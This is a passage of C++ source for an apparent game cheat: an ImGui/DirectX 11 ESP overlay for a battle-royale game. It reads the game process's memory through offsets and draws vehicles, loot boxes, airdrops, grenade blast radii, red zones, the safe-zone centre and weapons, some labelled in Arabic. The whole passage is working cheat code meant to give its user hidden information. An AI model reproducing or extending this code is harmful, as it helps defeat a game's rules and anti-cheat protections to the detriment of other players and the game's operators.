													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Dacia_Color[0], Setting::vahicle_Text_item_Dacia_Color[1], Setting::vahicle_Text_item_Dacia_Color[2], Setting::vahicle_Text_item_Dacia_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Dacia_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Rony && Vehicle.Name == u8"Rony")
											{
												if (Setting::vahicle_Text_item_Rony_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{
													std::string fuel;

													fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													if (Vehicle.driving)
													{
														color = DX11::ImGui_DX11::Color::Red;
													}
													else {
														color = ImColor(Setting::vahicle_Text_item_Rony_Color[0], Setting::vahicle_Text_item_Rony_Color[1], Setting::vahicle_Text_item_Rony_Color[2], Setting::vahicle_Text_item_Rony_Color[3]);
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Rony_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_UAZ && Vehicle.Name == u8"UAZ")
											{
												if (Setting::vahicle_Text_item_UAZ_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													if (Setting::hp)
													{
														std::string fuel;

														fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
													}

													if (Setting::feul)
													{
														if (Vehicle.driving)
														{
															color = DX11::ImGui_DX11::Color::Red;
														}
														else {
															color = ImColor(Setting::vahicle_Text_item_UAZ_Color[0], Setting::vahicle_Text_item_UAZ_Color[1], Setting::vahicle_Text_item_UAZ_Color[2], Setting::vahicle_Text_item_UAZ_Color[3]);
														}

														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_UAZ_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
													}
													continue;
												}
												if (Setting::vahicle_Text_item_Minibus && Vehicle.Name == u8"Minibus")
												{
													if (Setting::vahicle_Text_item_Minibus_Icon)
													{
														if (Setting::Vehicle_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
													}
													if (Setting::hp)
													{
														std::string fuel;

														fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
													}

													if (Setting::feul)
													{
														if (Vehicle.driving)
														{
															color = DX11::ImGui_DX11::Color::Red;
														}
														else {
															color = ImColor(Setting::vahicle_Text_item_Minibus_Color[0], Setting::vahicle_Text_item_Minibus_Color[1], Setting::vahicle_Text_item_Minibus_Color[2], Setting::vahicle_Text_item_Minibus_Color[3]);
														}

														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Minibus_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
													}
													continue;
												}
												if (Setting::vahicle_Text_item_PG117 && Vehicle.Name == u8"Ship")
												{
													if (Setting::vahicle_Text_item_PG117_Icon)
													{
														if (Setting::Vehicle_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
													}
													if (Setting::hp)
													{
														std::string fuel;

														fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
													}

													if (Setting::feul)
													{
														if (Vehicle.driving)
														{
															color = DX11::ImGui_DX11::Color::Red;
														}
														else {
															color = ImColor(Setting::vahicle_Text_item_PG117_Color[0], Setting::vahicle_Text_item_PG117_Color[1], Setting::vahicle_Text_item_PG117_Color[2], Setting::vahicle_Text_item_PG117_Color[3]);
														}

														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_PG117_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
													}
													continue;
												}
												if (Setting::vahicle_Text_item_Aquarail && Vehicle.Name == u8"Boat")
												{
													if (Setting::vahicle_Text_item_Aquarail_Icon)
													{
														if (Setting::Vehicle_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
													}
													if (Setting::hp)
													{
														std::string fuel;

														fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
													}

													if (Setting::feul)
													{
														if (Vehicle.driving)
														{
															color = DX11::ImGui_DX11::Color::Red;
														}
														else {
															color = ImColor(Setting::vahicle_Text_item_Aquarail_Color[0], Setting::vahicle_Text_item_Aquarail_Color[1], Setting::vahicle_Text_item_Aquarail_Color[2], Setting::vahicle_Text_item_Aquarail_Color[3]);
														}

														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Aquarail_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
													}
													continue;
												}
												if (Setting::vahicle_Text_item_BigFoot && Vehicle.Name == u8"Monster Truck")
												{
													if (Setting::vahicle_Text_item_BigFoot_Icon)
													{
														if (Setting::Vehicle_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
													}
													if (Setting::hp)
													{
														std::string fuel;

														fuel.append("Fuel:").append(std::to_string((int)(Vehicle.oil)).append("% - HP:").append(std::to_string((int)(Vehicle.hp)).append("%")));
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
													}

													if (Setting::feul)
													{
														if (Vehicle.driving)
														{
															color = DX11::ImGui_DX11::Color::Red;
														}
														else {
															color = ImColor(Setting::vahicle_Text_item_BigFoot_Color[0], Setting::vahicle_Text_item_BigFoot_Color[1], Setting::vahicle_Text_item_BigFoot_Color[2], Setting::vahicle_Text_item_BigFoot_Color[3]);
														}

														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_BigFoot_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
													}
													continue;
												}
											}

										}
									}
								}
							}
							if (Setting::Esp_Item_DeadBox)
							{

								ImColor color;

								if (Data::BoxesList.size() != 0)
								{
									TempBoxesList.clear();
									TempBoxesList = Data::BoxesList;
								}
								for (Deadbox Box : TempBoxesList)
								{

									if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, Box.Position, Screen, &Distance, ViewMatrix)) continue;


									if (Distance > 20)
									{
										continue;
									}
									std::string dead = (Box.Name) + "[" + to_string(Distance) + "M]";
									if (Box.IsDeadBox)
									{
										if (Distance > 50)
										{
											continue;
										}
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_DeadBox_TextSize, dead, Screen.X, Screen.Y + 13, ImColor(Setting::Esp_Item_DeadBox_Color[0], Setting::Esp_Item_DeadBox_Color[1], Setting::Esp_Item_DeadBox_Color[2], Setting::Esp_Item_DeadBox_Color[3]), false);
										if (Setting::Esp_Item_DeadBox_Icon)
										{
											if (Setting::Weapon_Icon_With_BG)
											{
												DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y + 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
												DX11::ImGui_DX11::DrawImage(DX11::DeadBox, Screen.X - 50, Screen.Y - 15, 40, 40);
											}
											else
											{
												DX11::ImGui_DX11::DrawImage(DX11::DeadBox, Screen.X - 50, Screen.Y - 15, 40, 40);
											}
										}
									}



									if (Setting::Esp_Item_DeadBox)
									{
										float yOffset{ -18.0f };
										for (int k = 0; k < Box.boxitem.size(); k++)
										{
											color = Box.boxitem[k].colorcod;
											std::string text = Box.boxitem[k].Displayname;
											DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, text, Screen.X, Screen.Y + 15 + (yOffset), Box.boxitem[k].colorcod, false);
											DX11::ImGui_DX11::DrawLine(Screen.X + 11, Screen.Y + 10, Screen.X + 11, Screen.Y + 15 + (yOffset), Box.boxitem[k].colorcod, 2.0f);

											yOffset -= 18.0f;

										}

									}

								}


							}
							if (Setting::Esp_Item_AirDrop)
							{

								ImColor color;

								if (Data::BoxesList.size() != 0)
								{
									TempBoxesList.clear();
									TempBoxesList = Data::BoxesList;
								}
								for (Deadbox Box : TempBoxesList)
								{

									if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, Box.Position, Screen, &Distance, ViewMatrix)) continue;

									if (Distance > 150)
									{
										continue;
									}
									std::string dead = (Box.Name) + "[" + to_string(Distance) + "M]";
									if (Box.isAirDrop)
									{
										if (Distance > 350)
										{
											continue;
										}
										if (Setting::Esp_Item_AirDrop_Icon)
										{
											if (Setting::Weapon_Icon_With_BG)
											{
												DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
												DX11::ImGui_DX11::DrawImage(DX11::AirDrop, Screen.X - 50, Screen.Y - 25, 40, 40);
											}
											else
											{
												DX11::ImGui_DX11::DrawImage(DX11::AirDrop, Screen.X - 50, Screen.Y - 25, 40, 40);
											}
										}
										string Dist = "";
										if (Box.bIsAirOpen)
										{
											Dist = "AirDrop [" + to_string(Distance) + "M] [Opened]";

										}
										else
										{
											Dist = "AirDrop [" + to_string(Distance) + "M]";
										}
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AirDrop_TextSize, Dist, Screen.X - 60, Screen.Y + 15, ImColor(Setting::Esp_Item_AirDrop_Color[0], Setting::Esp_Item_AirDrop_Color[1], Setting::Esp_Item_AirDrop_Color[2], Setting::Esp_Item_AirDrop_Color[3]), false);

									}



									if (Setting::Esp_Item_AirDrop)
									{
										float yOffset{ -18.0f };
										for (int k = 0; k < Box.boxitem.size(); k++)
										{
											color = Box.boxitem[k].colorcod;
											std::string text = Box.boxitem[k].Displayname;
											DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, text, Screen.X + 16, Screen.Y + 15 + (yOffset), Box.boxitem[k].colorcod, false);
											yOffset -= 18.0f;

										}

									}

								}


							}

						}
						if (Setting::BombAlert)
						{
							TempBombAlertList.clear();
							TempBombAlertList = Data::BombAlertList;
							for (BombAlert& bomb : TempBombAlertList) {
								bomb.Position = Utility::ReadMemoryEx<VECTOR3>(Utility::ReadMemoryEx<DWORD>(bomb.Address + Offset::RootComponent) + Offset::Position);
								if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, bomb.Position, Screen, &Distance, ViewMatrix)) continue;
								if (Distance > 210)continue;
								string  Name = bomb.Name + " [" + to_string(Distance) + "M]";
								string  Text1 = bomb.Name;
								const char* Aim;
								VECTOR3 Location = bomb.Position;
								DWORD LocalRoot = Utility::ReadMemoryEx<DWORD>(Data::LocalPlayer + Offset::RootComponent);
								VECTOR3 OurPosition = Utility::ReadMemoryEx<VECTOR3>(LocalRoot + Offset::Position);
								/////////////
								std::vector<VECTOR3> bombPath = bomb.Trajectory;
								VECTOR3 Previous = { 0 };
								VECTOR3 ConvertedPoint;
								for (int i = 0; i < bombPath.size(); i++)
								{
									//if (Algorithm::WorldToScreen1(bombPath[i], ConvertedPoint, &iDistanceToPointOnPath, Esp::ViewMatrix))
									//{
									//	if (ConvertedPoint.X > 0 && ConvertedPoint.Y > 0 && Previous.X > 0 && Previous.Y > 0)
									//		ImGui::GetBackgroundDrawList()->AddLine({ Previous.X,Previous.Y }, { ConvertedPoint.X,ConvertedPoint.Y }, DX11::ImGui_DX11::Color::Red, 2.0f);
									//}
									//Previous = ConvertedPoint;
									//cout << bombPath[i].X << "\t" << bombPath[i].Y << "\t" << bombPath[i].Z;
									//if (i == 0) DrawCurve(OurPosition, DX11::ImGui_DX11::Color::Red, bombPath[0], 2.0f,2.0f);
									//else DrawCurve(bombPath[i-1], DX11::ImGui_DX11::Color::Red, bombPath[i], 2.0f, 2.0f);
								}
								ImColor warncolor;
								int randomNum = (rand() % 2) + 1;
								if (randomNum == 1)
								{
									warncolor = DX11::ImGui_DX11::Color::Red;
								}
								if (randomNum == 2)
								{
									warncolor = DX11::ImGui_DX11::Color::White;
								}
								string bombnot = "";
								if (bomb.Name == "Frag Grenade")
								{
									bombnot = "<!> Be Careful " + bomb.Name + " " + to_string(Distance) + "m" + " <!>";
									//Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 300.0f, 1.8f, DX11::ImGui_DX11::Color::Red);
									//Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 400.0f, 1.8f, DX11::ImGui_DX11::Color::Blue);
									//Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 500.0f, 1.8f, DX11::ImGui_DX11::Color::Green);
									Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 600.0f, 1.8f, DX11::ImGui_DX11::Color::Red);
									DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
									DX11::ImGui_DX11::DrawImage(DX11::FragGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, Name, Screen.X, Screen.Y - 5, DX11::ImGui_DX11::Color::Red, true);

									//DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::special, 30, bombnot, (DX11Window::Width / 2) - 25, DX11Window::Height / 70 * 22.5f, warncolor, true);
								}
								if (bomb.Name == "Burn Molotov")
								{
									bombnot = "<!> Be Careful " + bomb.Name + " " + to_string(Distance) + "m" + " <!>";

									//Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 300.0f, 1.8f, DX11::ImGui_DX11::Color::Green);
									Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 400.0f, 1.8f, DX11::ImGui_DX11::Color::Red);
									DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
									DX11::ImGui_DX11::DrawImage(DX11::BurnGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, Name, Screen.X, Screen.Y - 5, DX11::ImGui_DX11::Color::Red, true);

									//DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::special, 30, bombnot, (DX11Window::Width / 2) - 25, DX11Window::Height / 60 * 22.5f, warncolor, true);

								}
								if (bomb.Name == "Flash Granade")
								{
									bombnot = "<!> Be Careful " + bomb.Name + " " + to_string(Distance) + "m" + " <!>";

									Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 400.0f, 1.8f, DX11::ImGui_DX11::Color::Green);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, Name, Screen.X, Screen.Y - 5, DX11::ImGui_DX11::Color::Red, true);

									//DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::special, 30, bombnot, (DX11Window::Width / 2) - 25, DX11Window::Height / 60 * 22.5f, warncolor, true);

								}
								if (bomb.Name == "Smoke Grenade")
								{
									bombnot = "<!> Be Careful " + bomb.Name + " " + to_string(Distance) + "m" + " <!>";

									Algorithm::Draw3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 400.0f, 1.8f, DX11::ImGui_DX11::Color::Green);
									DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
									DX11::ImGui_DX11::DrawImage(DX11::SmokeGrenade, Screen.X - 50, Screen.Y - 25, 40, 40);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, Name, Screen.X, Screen.Y - 5, DX11::ImGui_DX11::Color::Green, true);

									//DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::special, 30, bombnot, (DX11Window::Width / 2) - 25, DX11Window::Height / 60 * 22.5f, warncolor, true);

								}

							}
						}
						if (Setting::redzone)
						{
							TempBombAlertList.clear();
							TempBombAlertList = Data::BombAlertList;
							for (BombAlert& bomb : TempBombAlertList) {
								bomb.Position = Utility::ReadMemoryEx<VECTOR3>(Utility::ReadMemoryEx<DWORD>(bomb.Address + Offset::RootComponent) + Offset::Position);
								if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, bomb.Position, Screen, &Distance, ViewMatrix)) continue;
								if (Distance > 210)continue;
								string  Name = bomb.Name + "Red Zone [" + to_string(Distance) + "m]";
								const char* Aim;

								if (bomb.Name == "Air Bomb !")
								{
									if (Setting::Esp_Item_RedZone_Icon)
									{

										if (Setting::Weapon_Icon_With_BG)
										{
											DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
											DX11::ImGui_DX11::DrawImage(DX11::redzone, Screen.X - 50, Screen.Y - 25, 40, 40);
										}
										else
										{
											DX11::ImGui_DX11::DrawImage(DX11::redzone, Screen.X - 50, Screen.Y - 25, 40, 40);
										}
									}
									//Algorithm::DrawRedZone3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 300.0f, 1.7f, DX11::ImGui_DX11::Color::Red);
									//Algorithm::DrawRedZone3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 400.0f, 1.7f, DX11::ImGui_DX11::Color::Blue);
									//Algorithm::DrawRedZone3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 500.0f, 1.7f, DX11::ImGui_DX11::Color::Green);
									Algorithm::DrawRedZone3Dcircle(ViewMatrix, Data::lOCALPLAYERPosotion, bomb.Position, 32, 700.0f, 1.7f, DX11::ImGui_DX11::Color::Red);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_RedZone_TextSize, Name, Screen.X, Screen.Y - 5, ImColor(Setting::Esp_Item_RedZone_Color[0], Setting::Esp_Item_RedZone_Color[1], Setting::Esp_Item_RedZone_Color[2], Setting::Esp_Item_RedZone_Color[3]), true);

								}
							}
						}
						if (Setting::ZoneCenter)
						{
							TempItemList.clear();
							TempItemList = Data::ItemList;
							for (Item& Item : Data::ItemList)
							{
								if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, Item.Position, Screen, &Distance, ViewMatrix)) continue;

								string  Name = Item.Name + " [" + to_string(Distance) + "m]";
								const char* Aim;

								if (Item.Name == "!! Safe Zone Location !!")
								{
									DX11::ImGui_DX11::DrawImage(DX11::WhiteArrow, Screen.X + 27, Screen.Y - 40, 40, 40);
									DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_RedZone_TextSize, Name, Screen.X, Screen.Y, DX11::ImGui_DX11::Color::Green, true);
								}
							}

						}
					}
					else if (Setting::Lang == 1)
					{
						if (!Setting::fightmode)
						{
							if (Setting::allitemss)
							{
								if (Setting::impitems || Setting::healthitem || Setting::scope || Setting::allitemss && !Setting::fightmode)
								{
									if (Data::ItemList.size() != 0)
									{
										TempItemList.clear();
										TempItemList = Data::ItemList;
										for (Item& Item : Data::ItemList)
										{
											if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, Item.Position, Screen, &Distance, ViewMatrix)) continue;
											if (Distance > Setting::ItemDistance) continue;
											if (Setting::nearstAR && Item.Address == Memory::AimFindBestTargetWeapon())
											{
												DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height, Screen.X, Screen.Y, ImColor(1.0f, 0.0f, 0.0f, 1.0f), 3.0f);
											}
											std::string	Textt = Item.Name;
											Text = Item.Name + u8" [ﺮﺘﻣ " + to_string(Distance) + "]";
											if (Setting::allitemss)
											{
												if (Setting::UselessShow)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Textt, Screen.X - 70, Screen.Y + 30, ImColor(255, 255, 255, 255), true);

												}
												if (Setting::impitems)
												{
													std::string air = Item.Name + u8" [ﺮﺘﻣ " + to_string(Distance) + "]";
													if (Setting::Esp_Item_AKM && Item.Name == u8"ﻡﺍ ﻲﻛ ﻱﺍ")
													{
														if (Setting::Esp_Item_AKM_Icon)
														{

															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::AK, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::AK, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//	else
															//	{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AKM_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AKM_Color[0], Setting::Esp_Item_AKM_Color[1], Setting::Esp_Item_AKM_Color[2], Setting::Esp_Item_AKM_Color[3]), true);
														continue;
														//	}
													}
													if (Setting::Esp_Item_SCARL && Item.Name == u8"ﻝﺍ ﺭﺎﻜﺳ")
													{
														if (Setting::Esp_Item_SCARL_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::SCARL, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::SCARL, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}

														//	else
													//	{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SCARL_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M416_Color[0], Setting::Esp_Item_M416_Color[1], Setting::Esp_Item_M416_Color[2], Setting::Esp_Item_M416_Color[3]), true);
														continue;
														//	}


													}
													if (Setting::Esp_Item_M416 && Item.Name == u8"ﺭﻮﻓ ﻡﺍ")
													{
														if (Setting::Esp_Item_M416_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::M416, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::M416, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
															//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M416_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M416_Color[0], Setting::Esp_Item_M416_Color[1], Setting::Esp_Item_M416_Color[2], Setting::Esp_Item_M416_Color[3]), true);
														continue;
														//}


													//continue;
													}
													if (Setting::Esp_Item_M24 && Item.Name == u8"24ﻡﺍ")
													{
														if (Setting::Esp_Item_M24_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::M24, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::M24, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}

														//else
															//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M24_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M24_Color[0], Setting::Esp_Item_M24_Color[1], Setting::Esp_Item_M24_Color[2], Setting::Esp_Item_M24_Color[3]), true);
														continue;
														//	}
													}
													if (Setting::Esp_Item_Kar98k && Item.Name == u8"ﺭﺎﻛ")
													{
														if (Setting::Esp_Item_M24_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Kar98, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Kar98, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Kar98k_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Kar98k_Color[0], Setting::Esp_Item_Kar98k_Color[1], Setting::Esp_Item_Kar98k_Color[2], Setting::Esp_Item_Kar98k_Color[3]), true);
														continue;
														//}
													}
													if (Item.Name == u8"Win Statue")
													{
